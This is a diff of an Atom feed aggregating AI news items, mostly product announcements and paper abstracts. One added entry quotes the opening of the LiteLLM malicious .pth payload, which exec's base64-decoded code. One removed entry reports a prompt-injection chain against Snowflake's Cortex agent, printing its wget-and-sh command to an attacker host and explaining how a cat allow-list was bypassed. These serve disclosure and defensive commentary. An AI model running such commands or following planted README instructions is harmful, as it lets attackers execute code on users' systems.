@@ -1,10 +1,176 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-    <id>urn:2026-03-26T02:22:28.400Z</id>
+    <id>urn:2026-03-27T02:23:31.599Z</id>
     <title>osmos::feed</title>
-    <updated>2026-03-26T02:22:28.400Z</updated>
+    <updated>2026-03-27T02:23:31.599Z</updated>
     <generator>osmosfeed 1.15.1</generator>
     <link rel="alternate" href="index.html"/>
+    <entry>
+        <title type="html"><![CDATA[We Rewrote JSONata with AI in a Day, Saved $500K/Year]]></title>
+        <id>https://simonwillison.net/2026/Mar/27/vine-porting-jsonata/#atom-everything</id>
+        <link href="https://simonwillison.net/2026/Mar/27/vine-porting-jsonata/#atom-everything"/>
+        <updated>2026-03-27T00:35:01.000Z</updated>
+        <summary type="html"><![CDATA[<p><strong><a href="https://www.reco.ai/blog/we-rewrote-jsonata-with-ai">We Rewrote JSONata with AI in a Day, Saved $500K/Year</a></strong></p>
+Bit of a hyperbolic framing but this looks like another case study of <strong>vibe porting</strong>, this time spinning up a new custom Go implementation of the <a href="https://jsonata.org">JSONata</a> JSON expression language - similar in focus to jq, and heavily associated with the <a href="https://nodered.org">Node-RED</a> platform.</p>
+<p>As with other vibe-porting projects the key enabling factor was JSONata's existing test suite, which helped build the first working Go version in 7 hours and $400 of token spend.</p>
+<p>The Reco team then used a shadow deployment for a week to run the new and old versions in parallel to confirm the new implementation exactly matched the behavior of the old one.
+
+
+    <p>Tags: <a href="https://simonwillison.net/tags/go">go</a>, <a href="https://simonwillison.net/tags/json">json</a>, <a href="https://simonwillison.net/tags/ai">ai</a>, <a href="https://simonwillison.net/tags/generative-ai">generative-ai</a>, <a href="https://simonwillison.net/tags/llms">llms</a>, <a href="https://simonwillison.net/tags/agentic-engineering">agentic-engineering</a>, <a href="https://simonwillison.net/tags/vibe-porting">vibe-porting</a></p>]]></summary>
+        <author>
+            <name>Simon Willison's Weblog</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[My minute-by-minute response to the LiteLLM malware attack]]></title>
+        <id>https://simonwillison.net/2026/Mar/26/response-to-the-litellm-malware-attack/#atom-everything</id>
+        <link href="https://simonwillison.net/2026/Mar/26/response-to-the-litellm-malware-attack/#atom-everything"/>
+        <updated>2026-03-26T23:58:22.000Z</updated>
+        <summary type="html"><![CDATA[<p><strong><a href="https://futuresearch.ai/blog/litellm-attack-transcript/">My minute-by-minute response to the LiteLLM malware attack</a></strong></p>
+Callum McMahon reported the <a href="https://simonwillison.net/2026/Mar/24/malicious-litellm/">LiteLLM malware attack</a> to PyPI. Here he shares the Claude transcripts he used to help him confirm the vulnerability and decide what to do about it. Claude even suggested the PyPI security contact address after confirming the malicious code in a Docker container:</p>
+<blockquote>
+<p><strong>Confirmed</strong>. Fresh download from PyPI right now in an isolated Docker container:</p>
+<pre><code>Inspecting: litellm-1.82.8-py3-none-any.whl
+FOUND: litellm_init.pth
+SIZE: 34628 bytes
+FIRST 200 CHARS:
+import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRlbXBmaWxl...
+</code></pre>
+<p>The malicious <code>litellm==1.82.8</code> is <strong>live on PyPI right now</strong> and anyone installing or upgrading litellm will be infected. This needs to be reported to security@pypi.org immediately.</p>
+</blockquote>
+<p>I was chuffed to see Callum use my <a href="https://github.com/simonw/claude-code-transcripts">claude-code-transcripts</a> tool to publish the transcript of the conversation.
+
+    <p><small></small>Via <a href="https://news.ycombinator.com/item?id=47531967">Hacker News</a></small></p>
+
+
+    <p>Tags: <a href="https://simonwillison.net/tags/pypi">pypi</a>, <a href="https://simonwillison.net/tags/security">security</a>, <a href="https://simonwillison.net/tags/ai">ai</a>, <a href="https://simonwillison.net/tags/generative-ai">generative-ai</a>, <a href="https://simonwillison.net/tags/llms">llms</a>, <a href="https://simonwillison.net/tags/claude">claude</a>, <a href="https://simonwillison.net/tags/supply-chain">supply-chain</a></p>]]></summary>
+        <author>
+            <name>Simon Willison's Weblog</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Two AI Models Set to “stir government urgency”, But Will This Challenge Undo Them?]]></title>
+        <id>https://www.youtube.com/watch?v=s4tptozUJ8Y</id>
+        <link href="https://www.youtube.com/watch?v=s4tptozUJ8Y"/>
+        <updated>2026-03-26T20:15:12.000Z</updated>
+        <author>
+            <name>AI Explained</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Anthropic just released the real Claude Bot...]]></title>
+        <id>https://www.youtube.com/watch?v=wfeiCZK0mNs</id>
+        <link href="https://www.youtube.com/watch?v=wfeiCZK0mNs"/>
+        <updated>2026-03-26T18:11:51.000Z</updated>
+        <author>
+            <name>Fireship</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Watch James Manyika talk AI and creativity with LL COOL J.]]></title>
+        <id>https://blog.google/innovation-and-ai/technology/ai/ll-cool-j-dialogues/</id>
+        <link href="https://blog.google/innovation-and-ai/technology/ai/ll-cool-j-dialogues/"/>
+        <updated>2026-03-26T17:00:00.000Z</updated>
+        <summary type="html"><![CDATA[In the latest episode of our Dialogues on Technology and Society series, LL COOL J sits down with James Manyika.]]></summary>
+        <author>
+            <name>AI</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Quantization from the ground up]]></title>
+        <id>https://simonwillison.net/2026/Mar/26/quantization-from-the-ground-up/#atom-everything</id>
+        <link href="https://simonwillison.net/2026/Mar/26/quantization-from-the-ground-up/#atom-everything"/>
+        <updated>2026-03-26T16:21:09.000Z</updated>
+        <summary type="html"><![CDATA[<p><strong><a href="https://ngrok.com/blog/quantization">Quantization from the ground up</a></strong></p>
+Sam Rose continues <a href="https://simonwillison.net/tags/sam-rose/">his streak</a> of publishing spectacularly informative interactive essays, this time explaining how quantization of Large Language Models works (which he says might be "<a href="https://twitter.com/samwhoo/status/2036845101561835968">the best post I've ever made</a>".)</p>
+<p>Also included is the best visual explanation I've ever seen of how floating point numbers are represented using binary digits.</p>
+<p><img alt="Screenshot of an interactive float32 binary representation tool showing the value -48.92364502, with color-coded bit fields labeled S (sign), EXPONENT (blue), and SIGNIFICAND (pink), displaying the 32-bit pattern 11000010010000111101100001110100000, and a slider control at the bottom along with minus, plus, and reset buttons." src="https://static.simonwillison.net/static/2026/float.jpg" /></p>
+<p>I hadn't heard about <strong>outlier values</strong> in quantization - rare float values that exist outside of the normal tiny-value distribution - but apparently they're very important:</p>
+<blockquote>
+<p>Why do these outliers exist? [...] tl;dr: no one conclusively knows, but a small fraction of these outliers are <em>very</em> important to model quality. Removing even a <em>single</em> "super weight," as Apple calls them, can cause the model to output complete gibberish.</p>
+<p>Given their importance, real-world quantization schemes sometimes do extra work to preserve these outliers. They might do this by not quantizing them at all, or by saving their location and value into a separate table, then removing them so that their block isn't destroyed.</p>
+</blockquote>
+<p>Plus there's a section on <a href="https://ngrok.com/blog/quantization#how-much-does-quantization-affect-model-accuracy">How much does quantization affect model accuracy?</a>. Sam explains the concepts of <strong>perplexity</strong> and ** KL divergence ** and then uses the <a href="https://github.com/ggml-org/llama.cpp/tree/master/tools/perplexity">llama.cpp perplexity tool</a> and a run of the GPQA benchmark to show how different quantization levels affect Qwen 3.5 9B.</p>
+<p>His conclusion:</p>
+<blockquote>
+<p>It looks like 16-bit to 8-bit carries almost no quality penalty. 16-bit to 4-bit is more noticeable, but it's certainly not a quarter as good as the original. Closer to 90%, depending on how you want to measure it.</p>
+</blockquote>
+
+
+    <p>Tags: <a href="https://simonwillison.net/tags/computer-science">computer-science</a>, <a href="https://simonwillison.net/tags/ai">ai</a>, <a href="https://simonwillison.net/tags/explorables">explorables</a>, <a href="https://simonwillison.net/tags/generative-ai">generative-ai</a>, <a href="https://simonwillison.net/tags/llms">llms</a>, <a href="https://simonwillison.net/tags/sam-rose">sam-rose</a>, <a href="https://simonwillison.net/tags/qwen">qwen</a></p>]]></summary>
+        <author>
+            <name>Simon Willison's Weblog</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Transform your headphones into a live personal translator on iOS.]]></title>
+        <id>https://blog.google/products-and-platforms/products/translate/live-translate-with-headphones/</id>
+        <link href="https://blog.google/products-and-platforms/products/translate/live-translate-with-headphones/"/>
+        <updated>2026-03-26T16:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Google Translate’s Live translate with headphones is officially arriving on iOS! And we're expanding the capability for both iOS and Android users to even more countries…]]></summary>
+        <author>
+            <name>AI</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Gemini 3.1 Flash Live: Making audio AI more natural and reliable]]></title>
+        <id>https://deepmind.google/blog/gemini-3-1-flash-live-making-audio-ai-more-natural-and-reliable/</id>
+        <link href="https://deepmind.google/blog/gemini-3-1-flash-live-making-audio-ai-more-natural-and-reliable/"/>
+        <updated>2026-03-26T15:23:35.000Z</updated>
+        <summary type="html"><![CDATA[Our latest voice model has improved precision and lower latency to make voice interactions more fluid, natural and precise.]]></summary>
+        <author>
+            <name>Google DeepMind News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Gemini 3.1 Flash Live: Making audio AI more natural and reliable]]></title>
+        <id>https://blog.google/innovation-and-ai/models-and-research/gemini-models/gemini-3-1-flash-live/</id>
+        <link href="https://blog.google/innovation-and-ai/models-and-research/gemini-models/gemini-3-1-flash-live/"/>
+        <updated>2026-03-26T15:21:00.000Z</updated>
+        <summary type="html"><![CDATA[Gemini 3.1 Flash Live is now available across Google products.]]></summary>
+        <author>
+            <name>AI</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Search Live is expanding globally]]></title>
+        <id>https://blog.google/products-and-platforms/products/search/search-live-global-expansion/</id>
+        <link href="https://blog.google/products-and-platforms/products/search/search-live-global-expansion/"/>
+        <updated>2026-03-26T15:00:00.000Z</updated>
+        <summary type="html"><![CDATA[We’re expanding Search Live globally, to all languages and locations where AI Mode is available.]]></summary>
+        <author>
+            <name>AI</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[This Datacenter Problem Nobody's Talking About]]></title>
+        <id>https://www.youtube.com/watch?v=slX_lDDobEs</id>
+        <link href="https://www.youtube.com/watch?v=slX_lDDobEs"/>
+        <updated>2026-03-26T02:28:07.000Z</updated>
+        <author>
+            <name>Matt Wolfe</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Drop-In Perceptual Optimization for 3D Gaussian Splatting]]></title>
+        <id>drop-in</id>
+        <link href="https://machinelearning.apple.com/research/drop-in"/>
+        <updated>2026-03-26T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Despite their output being ultimately consumed by human viewers, 3D Gaussian Splatting (3DGS) methods often rely on ad-hoc combinations of pixel-level losses, resulting in blurry renderings. To address this, we systematically explore perceptual optimization strategies for 3DGS by searching over a diverse set of distortion losses. We conduct the first-of-its-kind large-scale human subjective study on 3DGS, involving 39,320 pairwise ratings across several datasets and 3DGS frameworks. A regularized version of Wasserstein Distortion, which we call WD-R, emerges as the clear winner, excelling at…]]></summary>
+        <author>
+            <name>Apple Machine Learning Research</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Revisiting the Scaling Properties of Downstream Metrics in Large Language Model Training]]></title>
+        <id>downstream-metrics</id>
+        <link href="https://machinelearning.apple.com/research/downstream-metrics"/>
+        <updated>2026-03-26T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[While scaling laws for Large Language Models (LLMs) traditionally focus on proxy metrics like pretraining loss, predicting downstream task performance has been considered unreliable. This paper challenges that view by proposing a direct framework to model the scaling of benchmark performance from the training budget. We find that for a fixed token-to-parameter ratio, a simple power law can accurately describe the scaling behavior of log accuracy on multiple popular downstream tasks. Our results show that the direct approach extrapolates better than the previously proposed two-stage procedure…]]></summary>
+        <author>
+            <name>Apple Machine Learning Research</name>
+        </author>
+    </entry>
     <entry>
         <title type="html"><![CDATA[datasette-files-s3 0.1a1]]></title>
         <id>https://simonwillison.net/2026/Mar/25/datasette-files-s3/#atom-everything</id>
@@ -87,6 +253,16 @@ Daniel Hnyk used the <a href="https://console.cloud.google.com/bigquery?p=bigque
         </author>
     </entry>
     <entry>
+        <title type="html"><![CDATA[Protecting people from harmful manipulation]]></title>
+        <id>https://deepmind.google/blog/protecting-people-from-harmful-manipulation/</id>
+        <link href="https://deepmind.google/blog/protecting-people-from-harmful-manipulation/"/>
+        <updated>2026-03-25T16:46:20.000Z</updated>
+        <summary type="html"><![CDATA[Google DeepMind researches AI's harmful manipulation risks across areas like finance and health, leading to new safety measures.]]></summary>
+        <author>
+            <name>Google DeepMind News</name>
+        </author>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[Lyria 3 Pro: Create longer tracks in more]]></title>
         <id>https://deepmind.google/blog/lyria-3-pro-create-longer-tracks-in-more/</id>
         <link href="https://deepmind.google/blog/lyria-3-pro-create-longer-tracks-in-more/"/>
@@ -137,22 +313,22 @@ Daniel Hnyk used the <a href="https://console.cloud.google.com/bigquery?p=bigque
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Exclusive Self Attention]]></title>
-        <id>exclusive-self-attention</id>
-        <link href="https://machinelearning.apple.com/research/exclusive-self-attention"/>
-        <updated>2026-03-25T00:00:00.000Z</updated>
-        <summary type="html"><![CDATA[We introduce exclusive self attention (XSA), a simple modification of self attention (SA) that improves Transformer’s sequence modeling performance. The key idea is to constrain attention to capture only information orthogonal to the token’s own value vector (thus excluding information of self position), encouraging better context modeling. Evaluated on the standard language modeling task, XSA consistently outperforms SA across model sizes up to 2.7B parameters and shows increasingly larger gains as sequence length grows.]]></summary>
-        <author>
-            <name>Apple Machine Learning Research</name>
-        </author>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[Thinking into the Future: Latent Lookahead Training for Transformers]]></title>
         <id>latent-lookahead</id>
         <link href="https://machinelearning.apple.com/research/latent-lookahead"/>
         <updated>2026-03-25T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[This paper was accepted at the Workshop on Latent & Implicit Thinking – Going Beyond CoT Reasoning 2026 at ICLR.
 Autoregressive language models trained with next-token prediction generate text by sampling one discrete token at a time. Although very scalable, this objective forces the model to commit at every step, preventing it from exploring or reflecting upon multiple plausible continuations. Furthermore, the compute allocation across tokens is uniform; every token is formed based on a single forward-pass, potentially limiting the model’s expressiveness in cases where difficult tokens…]]></summary>
+        <author>
+            <name>Apple Machine Learning Research</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Exclusive Self Attention]]></title>
+        <id>exclusive-self-attention</id>
+        <link href="https://machinelearning.apple.com/research/exclusive-self-attention"/>
+        <updated>2026-03-25T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[We introduce exclusive self attention (XSA), a simple modification of self attention (SA) that improves Transformer’s sequence modeling performance. The key idea is to constrain attention to capture only information orthogonal to the token’s own value vector (thus excluding information of self position), encouraging better context modeling. Evaluated on the standard language modeling task, XSA consistently outperforms SA across model sizes up to 2.7B parameters and shows increasingly larger gains as sequence length grows.]]></summary>
         <author>
             <name>Apple Machine Learning Research</name>
         </author>
@@ -302,21 +478,21 @@ The LiteLLM v1.82.8 package published to PyPI was compromised with a particularl
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Update on the OpenAI Foundation]]></title>
-        <id>https://openai.com/index/update-on-the-openai-foundation</id>
-        <link href="https://openai.com/index/update-on-the-openai-foundation"/>
-        <updated>2026-03-24T09:00:00.000Z</updated>
-        <summary type="html"><![CDATA[The OpenAI Foundation announces plans to invest at least $1 billion in curing diseases, economic opportunity, AI resilience, and community programs.]]></summary>
-        <author>
-            <name>OpenAI News</name>
-        </author>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[Powering product discovery in ChatGPT]]></title>
         <id>https://openai.com/index/powering-product-discovery-in-chatgpt</id>
         <link href="https://openai.com/index/powering-product-discovery-in-chatgpt"/>
         <updated>2026-03-24T09:00:00.000Z</updated>
         <summary type="html"><![CDATA[ChatGPT introduces richer, visually immersive shopping powered by the Agentic Commerce Protocol, enabling product discovery, side-by-side comparisons, and merchant integration.]]></summary>
+        <author>
+            <name>OpenAI News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Update on the OpenAI Foundation]]></title>
+        <id>https://openai.com/index/update-on-the-openai-foundation</id>
+        <link href="https://openai.com/index/update-on-the-openai-foundation"/>
+        <updated>2026-03-24T09:00:00.000Z</updated>
+        <summary type="html"><![CDATA[The OpenAI Foundation announces plans to invest at least $1 billion in curing diseases, economic opportunity, AI resilience, and community programs.]]></summary>
         <author>
             <name>OpenAI News</name>
         </author>
@@ -338,21 +514,21 @@ The LiteLLM v1.82.8 package published to PyPI was compromised with a particularl
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Trained on Tokens, Calibrated on Concepts: The Emergence of Semantic Calibration in LLMs]]></title>
-        <id>trained-on-tokens</id>
-        <link href="https://machinelearning.apple.com/research/trained-on-tokens"/>
-        <updated>2026-03-24T00:00:00.000Z</updated>
-        <summary type="html"><![CDATA[Large Language Models (LLMs) often lack meaningful confidence estimates for their outputs. While base LLMs are known to exhibit next-token calibration, it remains unclear whether they can assess confidence in the actual meaning of their responses beyond the token level. We find that, when using a certain sampling-based notion of semantic calibration, base LLMs are remarkably well-calibrated: they can meaningfully assess confidence in open-domain question-answering tasks, despite not being explicitly trained to do so. Our main theoretical contribution establishes a mechanism for why semantic…]]></summary>
-        <author>
-            <name>Apple Machine Learning Research</name>
-        </author>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[Scaling Synthetic Task Generation for Agents via Exploration]]></title>
         <id>scaling-synthetic-task</id>
         <link href="https://machinelearning.apple.com/research/scaling-synthetic-task"/>
         <updated>2026-03-24T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[Post-Training Multimodal Large Language Models (MLLMs) to build interactive agents holds promise across domains such as computer-use, web navigation, and robotics. A key challenge in scaling such post-training is lack of high-quality downstream agentic task datasets with tasks that are diverse, feasible, and verifiable. Existing approaches for task generation rely heavily on human annotation or prompting MLLM with limited downstream environment information, which is either costly or poorly scalable as it yield tasks with limited coverage. To remedy this, we present AutoPlay, a scalable…]]></summary>
+        <author>
+            <name>Apple Machine Learning Research</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Trained on Tokens, Calibrated on Concepts: The Emergence of Semantic Calibration in LLMs]]></title>
+        <id>trained-on-tokens</id>
+        <link href="https://machinelearning.apple.com/research/trained-on-tokens"/>
+        <updated>2026-03-24T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Large Language Models (LLMs) often lack meaningful confidence estimates for their outputs. While base LLMs are known to exhibit next-token calibration, it remains unclear whether they can assess confidence in the actual meaning of their responses beyond the token level. We find that, when using a certain sampling-based notion of semantic calibration, base LLMs are remarkably well-calibrated: they can meaningfully assess confidence in open-domain question-answering tasks, despite not being explicitly trained to do so. Our main theoretical contribution establishes a mechanism for why semantic…]]></summary>
         <author>
             <name>Apple Machine Learning Research</name>
         </author>
@@ -982,29 +1158,6 @@ Here's a fascinating piece of research by Dan Woods, who managed to get a custom
         </author>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Snowflake Cortex AI Escapes Sandbox and Executes Malware]]></title>
-        <id>https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything</id>
-        <link href="https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything"/>
-        <updated>2026-03-18T17:43:49.000Z</updated>
-        <summary type="html"><![CDATA[<p><strong><a href="https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware">Snowflake Cortex AI Escapes Sandbox and Executes Malware</a></strong></p>
-PromptArmor report on a prompt injection attack chain in Snowflake's <a href="https://docs.snowflake.com/en/user-guide/snowflake-cortex/cortex-agents">Cortex Agent</a>, now fixed.</p>
-<p>The attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.</p>
-<p>The attack caused the agent to execute this code:</p>
-<pre><code>cat &lt; &lt;(sh &lt; &lt;(wget -q0- https://ATTACKER_URL.com/bugbot))
-</code></pre>
-<p>Cortex listed <code>cat</code> commands as safe to run without human approval, without protecting against this form of process substitution that can occur in the body of the command.</p>
-<p>I've seen allow-lists against command patterns like this in a bunch of different agent tools and I don't trust them at all - they feel inherently unreliable to me.</p>
-<p>I'd rather treat agent commands as if they could do anything that process itself is allowed to do, hence my interest in deterministic sandboxes that operate outside of the layer of the agent itself.
-
-    <p><small></small>Via <a href="https://news.ycombinator.com/item?id=47427017">Hacker News</a></small></p>
-
-
-    <p>Tags: <a href="https://simonwillison.net/tags/sandboxing">sandboxing</a>, <a href="https://simonwillison.net/tags/security">security</a>, <a href="https://simonwillison.net/tags/ai">ai</a>, <a href="https://simonwillison.net/tags/prompt-injection">prompt-injection</a>, <a href="https://simonwillison.net/tags/generative-ai">generative-ai</a>, <a href="https://simonwillison.net/tags/llms">llms</a></p>]]></summary>
-        <author>
-            <name>Simon Willison's Weblog</name>
-        </author>
-    </entry>
-    <entry>
         <title type="html"><![CDATA[OpenClaw Just Got WAY Easier to Install]]></title>
         <id>https://www.youtube.com/shorts/vpTvoxIrlHs</id>
         <link href="https://www.youtube.com/shorts/vpTvoxIrlHs"/>
@@ -1012,16 +1165,6 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         <summary type="html"><![CDATA[Enjoy the videos and music you love, upload original content, and share it all with friends, family, and the world on YouTube.]]></summary>
         <author>
             <name>Matt Wolfe</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Goldilocks RL: Tuning Task Difficulty to Escape Sparse Rewards for Reasoning]]></title>
-        <id>goldilocks</id>
-        <link href="https://machinelearning.apple.com/research/goldilocks"/>
-        <updated>2026-03-18T00:00:00.000Z</updated>
-        <summary type="html"><![CDATA[Reinforcement learning has emerged as a powerful paradigm for unlocking reasoning capabilities in large language models. However, relying on sparse rewards makes this process highly sample-inefficient, as models must navigate vast search spaces with minimal feedback. While classic curriculum learning aims to mitigate this by ordering data based on complexity, the right ordering for a specific model is often unclear. To address this, we propose Goldilocks, a novel teacher-driven data sampling strategy that aims to predict each question’s difficulty for the student model. The teacher model…]]></summary>
-        <author>
-            <name>Apple Machine Learning Research</name>
         </author>
     </entry>
     <entry>
@@ -1035,6 +1178,16 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         </author>
     </entry>
     <entry>
+        <title type="html"><![CDATA[Goldilocks RL: Tuning Task Difficulty to Escape Sparse Rewards for Reasoning]]></title>
+        <id>goldilocks</id>
+        <link href="https://machinelearning.apple.com/research/goldilocks"/>
+        <updated>2026-03-18T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Reinforcement learning has emerged as a powerful paradigm for unlocking reasoning capabilities in large language models. However, relying on sparse rewards makes this process highly sample-inefficient, as models must navigate vast search spaces with minimal feedback. While classic curriculum learning aims to mitigate this by ordering data based on complexity, the right ordering for a specific model is often unclear. To address this, we propose Goldilocks, a novel teacher-driven data sampling strategy that aims to predict each question’s difficulty for the student model. The teacher model…]]></summary>
+        <author>
+            <name>Apple Machine Learning Research</name>
+        </author>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[Money Forward brings Cursor’s coding agents to product, design, and QA]]></title>
         <id>https://cursor.com/blog/money-forward</id>
         <link href="https://cursor.com/blog/money-forward"/>
@@ -1042,106 +1195,6 @@ PromptArmor report on a prompt injection attack chain in Snowflake's <a href="ht
         <summary type="html"><![CDATA[Over 1,000 Money Forward employees now use Cursor every day.]]></summary>
         <author>
             <name>Cursor Blog</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Quoting Ken Jin]]></title>
-        <id>https://simonwillison.net/2026/Mar/17/ken-jin/#atom-everything</id>
-        <link href="https://simonwillison.net/2026/Mar/17/ken-jin/#atom-everything"/>
-        <updated>2026-03-17T21:48:26.000Z</updated>
-        <summary type="html"><![CDATA[<blockquote cite="https://fidget-spinner.github.io/posts/jit-on-track.html"><p>Great news—we’ve hit our (very modest) performance goals for the CPython JIT over a year early for macOS AArch64, and a few months early for x86_64 Linux. The 3.15 alpha JIT is about <strong>11-12%</strong> faster on macOS AArch64 than the tail calling interpreter, and <strong>5-6%</strong>faster than the standard interpreter on x86_64 Linux.</p></blockquote>
-<p class="cite">&mdash; <a href="https://fidget-spinner.github.io/posts/jit-on-track.html">Ken Jin</a>, Python 3.15’s JIT is now back on track</p>
-
-    <p>Tags: <a href="https://simonwillison.net/tags/python">python</a></p>]]></summary>
-        <author>
-            <name>Simon Willison's Weblog</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[GPT-5.4 mini and GPT-5.4 nano, which can describe 76,000 photos for $52]]></title>
-        <id>https://simonwillison.net/2026/Mar/17/mini-and-nano/#atom-everything</id>
-        <link href="https://simonwillison.net/2026/Mar/17/mini-and-nano/#atom-everything"/>
-        <updated>2026-03-17T19:39:17.000Z</updated>
-        <summary type="html"><![CDATA[<p>OpenAI today: <a href="https://openai.com/index/introducing-gpt-5-4-mini-and-nano/">Introducing GPT‑5.4 mini and nano</a>. These models join GPT-5.4 which was released <a href="https://openai.com/index/introducing-gpt-5-4/">two weeks ago</a>.</p>
-<p>OpenAI's self-reported benchmarks show the new 5.4-nano out-performing their previous GPT-5 mini model when run at maximum reasoning effort. The new mini is also 2x faster than the previous mini.</p>
-<p>Here's how the pricing looks - all prices are per million tokens. <code>gpt-5.4-nano</code> is notably even cheaper than Google's Gemini 3.1 Flash-Lite:</p>
-<center><table>
-  <thead>
-    <tr>
-      <th>Model</th>
-      <th>Input</th>
-      <th>Cached input</th>
-      <th>Output</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>gpt-5.4</td>
-      <td>$2.50</td>
-      <td>$0.25</td>
-      <td>$15.00</td>
-    </tr>
-    <tr>
-      <td>gpt-5.4-mini</td>
-      <td>$0.75</td>
-      <td>$0.075</td>
-      <td>$4.50</td>
-    </tr>
-    <tr>
-      <td>gpt-5.4-nano</td>
-      <td>$0.20</td>
-      <td>$0.02</td>
-      <td>$1.25</td>
-    </tr>
-    <tr><td colspan="4"><center>Other models for comparison</center></td></tr>
-    <tr>
-      <td>Claude Opus 4.6</td>
-      <td>$5.00</td>
-      <td>-</td>
-      <td>$25.00</td>
-    </tr>
-    <tr>
-      <td>Claude Sonnet 4.6</td>
-      <td>$3.00</td>
-      <td>-</td>
-      <td>$15.00</td>
-    </tr>
-    <tr>
-      <td>Gemini 3.1 Pro</td>
-      <td>$2.00</td>
-      <td>-</td>
-      <td>$12.00</td>
-    </tr>
-    <tr>
-      <td>Claude Haiku 4.5</td>
-      <td>$1.00</td>
-      <td>-</td>
-      <td>$5.00</td>
-    </tr>
-<tr>
-      <td>Gemini 3.1 Flash-Lite</td>
-      <td>$0.25</td>
-      <td>-</td>
-      <td>$1.50</td>
-    </tr>
-  </tbody>
-</table></center>
-<p>I used GPT-5.4 nano to generate a description of this photo I took at the <a href="https://www.niche-museums.com/118">John M. Mossman Lock Collection</a>:</p>
-<p><img src="https://static.simonwillison.net/static/2026/IMG_2324.jpeg" alt="Description below" style="max-width: 100%;" /></p>
-<pre><code>llm -m gpt-5.4-nano -a IMG_2324.jpeg 'describe image'
-</code></pre>
-<p>Here's the output:</p>
-<blockquote>
-<p>The image shows the interior of a museum gallery with a long display wall. White-painted brick walls are covered with many framed portraits arranged in neat rows. Below the portraits, there are multiple glass display cases with dark wooden frames and glass tops/fronts, containing various old historical objects and equipment. The room has a polished wooden floor, hanging ceiling light fixtures/cords, and a few visible pipes near the top of the wall. In the foreground, glass cases run along the length of the room, reflecting items from other sections of the gallery.</p>
-</blockquote>
-<p>That took 2,751 input tokens and 112 output tokens, at a cost of <a href="https://www.llm-prices.com/#it=2751&amp;ot=112&amp;sel=gpt-5.4-nano">0.069 cents</a> (less than a tenth of a cent). That means describing every single photo in my 76,000 photo collection would cost around $52.44.</p>
-<p>I released <a href="https://llm.datasette.io/en/stable/changelog.html#v0-29">llm 0.29</a> with support for the new models.</p>
-<p>Then I had OpenAI Codex loop through all five reasoning effort levels and all three models and produce this combined SVG grid of pelicans riding bicycles (<a href="https://gist.github.com/simonw/f16292d9a5b90b28054cff3ba497a3ca">generation transcripts here</a>). I do like the gpt-5.4 xhigh one the best, it has a good bicycle (with nice spokes) and the pelican has a fish in its beak!</p>
-<p><img src="https://static.simonwillison.net/static/2026/gpt-5.4-pelican-family.svg" alt="Described by Claude Opus 4.6: A 5x3 comparison grid of AI-generated cartoon illustrations of a pelican riding a bicycle. Columns are labeled &quot;gpt-5.4-nano&quot;, &quot;gpt-5.4-mini&quot;, and &quot;gpt-5.4&quot; across the top, and rows are labeled &quot;none&quot;, &quot;low&quot;, &quot;medium&quot;, &quot;high&quot;, and &quot;xhigh&quot; down the left side, representing quality/detail settings. In the &quot;none&quot; row, gpt-5.4-nano shows a chaotic white bird with misplaced arrows and tangled wheels on grass, gpt-5.4-mini shows a duck-like brown bird awkwardly straddling a motorcycle-like bike, and gpt-5.4 shows a stiff gray-and-white pelican sitting atop a blue tandem bicycle with extra legs. In the &quot;low&quot; row, nano shows a chubby round white bird pedaling with small feet on grass, mini shows a cleaner white bird riding a blue bicycle with motion lines, and gpt-5.4 shows a pelican with a blue cap riding confidently but with slightly awkward proportions. In the &quot;medium&quot; row, nano regresses to a strange bird standing over bowling balls on ice, mini shows two plump white birds merged onto one yellow-wheeled bicycle, and gpt-5.4 shows a more recognizable gray-and-white pelican on a red bicycle but with tangled 